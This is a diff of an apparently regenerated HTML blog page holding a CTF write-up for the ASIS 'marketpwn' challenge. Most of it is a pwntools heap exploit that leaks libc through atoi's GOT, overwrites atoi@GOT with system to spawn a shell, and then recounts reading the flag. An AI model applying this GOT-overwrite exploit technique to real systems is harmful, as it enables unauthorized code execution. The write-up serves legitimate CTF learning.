-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c"># exit select car menu</span>
-    
-    <span class="c"># leak atoi's got</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking atoi's got &amp; libc base..."</span><span class="p">)</span>
+    <span class="c1"># add comment and overwrite customer pointer, change it to atoi@got.plt
+</span>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car 15 struct (for leaking got)..."</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># add customer
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span> <span class="c1"># add comment
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">]))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># exit customer menu
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c1"># exit select car menu
+</span>    
+    <span class="c1"># leak atoi's got
+</span>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking atoi's got &amp; libc base..."</span><span class="p">)</span>
     <span class="n">leak_got</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
     <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
 
-    <span class="c"># overwrite customer pointer to heap_base+0x10</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car 15 struct (for corrupting car array)..."</span><span class="p">)</span>
+    <span class="c1"># overwrite customer pointer to heap_base+0x10
+</span>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car 15 struct (for corrupting car array)..."</span><span class="p">)</span>
     <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
     <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)]</span>
     <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c"># exit select car menu</span>
-
-    <span class="c"># free &amp; reallocate heap_base+0x10 , now we can control the car array </span>
-    <span class="c"># after we control the car array, overite car[14] and make it point to atoi's got</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car array..."</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c1"># exit select car menu
+</span>
+    <span class="c1"># free &amp; reallocate heap_base+0x10 , now we can control the car array 
+</span>    <span class="c1"># after we control the car array, overite car[14] and make it point to atoi's got
+</span>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car array..."</span><span class="p">)</span>
     <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
     <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">])]</span>
     <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c"># exit select car menu</span>
-    
-    <span class="c"># overwrite atoi's got</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting atoi's got..."</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># select car</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"14"</span><span class="p">)</span> <span class="c"># input index</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span> <span class="c"># set model (atoi's got)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"model</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c1"># exit select car menu
+</span>    
+    <span class="c1"># overwrite atoi's got
+</span>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting atoi's got..."</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># select car
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"14"</span><span class="p">)</span> <span class="c1"># input index
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span> <span class="c1"># set model (atoi's got)
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"model</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
 
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"get shell !"</span><span class="p">)</span>
@@ -537,7 +537,7 @@ customer+64  |        0x12345680| char* comment
 </code></pre></div></div>
 
 <p>After I finished the exploit, I found it once again, the exploit has timeout due to the crappy internet connection. So I upload the exploit to trello and ask <strong>freetsubasa</strong> if she can send the payload for me. And then she told me that <strong>she had the shell spawned, but she can’t find the flag.</strong> What ?</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la
 total 40
 drwxr-x--- 2 root marketpwn  4096 Sep  8 10:02 .
 drwxr-xr-x 3 root root       4096 Sep  8 09:51 ..
@@ -550,18 +550,18 @@ lrwxrwxrwx 1 root marketpwn     9 Sep  8 09:59 .bash_history -&gt; /dev/null
 -rwxr-xr-x 1 root marketpwn   104 Sep  8 09:56 wrapper.sh
 </code></pre></div></div>
 <p>OK, so the ASIS organizer try to play some trick on us. It’s alright, no big deal, just give us the flag so we can pass the challenge.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat ._flag
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat ._flag
 cat: ._flag: No such file or directory
 </code></pre></div></div>
 <p>WHAT. THE. F*CK.</p>
 
 <p>How is this even possible? The file is just right there and now you’re telling me the file does not exist? This is bullsh*t !@#$%^&amp;</p>
 
-<p>So after we have the shell, we spent another 30 minutes trying to figure out how to read the god damn flag. After some trial &amp; error, teammate <strong>ddaa</strong> finally get the flag by using the <code class="highlighter-rouge">cat .*</code> command. It’s strange because I’ve tried <code class="highlighter-rouge">for f in .*;do cat $f;done</code> and it failed, don’t know why <strong>:/</strong></p>
+<p>So after we have the shell, we spent another 30 minutes trying to figure out how to read the god damn flag. After some trial &amp; error, teammate <strong>ddaa</strong> finally get the flag by using the <code class="language-plaintext highlighter-rouge">cat .*</code> command. It’s strange because I’ve tried <code class="language-plaintext highlighter-rouge">for f in .*;do cat $f;done</code> and it failed, don’t know why <strong>:/</strong></p>
 
 <p>Anyway we finally got the flag and the 177 points. The binary itself was a great challenge, but the command line one was kind of evil <strong>-.-</strong></p>
 
-<p>flag: <code class="highlighter-rouge">ASIS{a0b8813fc566836c8b5f37fe68c684c5}</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">ASIS{a0b8813fc566836c8b5f37fe68c684c5}</code></p>
 
         
       </section>
@@ -674,7 +674,6 @@ cat: ._flag: No such file or directory
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -694,7 +693,6 @@ cat: ._flag: No such file or directory
 
         
           
-          
 
 
 
@@ -713,7 +711,6 @@ cat: ._flag: No such file or directory
 </div>
 
         
-          
           
 
 
@@ -736,7 +733,6 @@ cat: ._flag: No such file or directory
 
         
           
-          
 
 
 
@@ -757,6 +753,7 @@ cat: ._flag: No such file or directory
         
       </div>
     </div>
+  
   
 </div>
 
@@ -807,7 +804,7 @@ cat: ._flag: No such file or directory
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
